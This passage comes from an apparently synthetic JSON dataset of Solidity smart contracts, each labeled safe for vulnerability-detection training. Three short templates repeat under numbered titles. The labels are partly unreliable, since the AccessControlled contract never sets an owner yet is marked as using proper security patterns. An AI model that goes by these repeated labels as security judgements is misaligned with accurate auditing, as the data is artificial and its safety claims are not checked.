    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 152",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 153",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 154",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 155",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 156",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 157",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 158",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 159",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 160",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 161",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 162",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 163",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 164",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 165",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 166",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 167",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 168",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 169",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 170",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 171",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 172",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 173",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 174",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 175",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 176",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 177",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 178",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 179",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 180",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 181",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
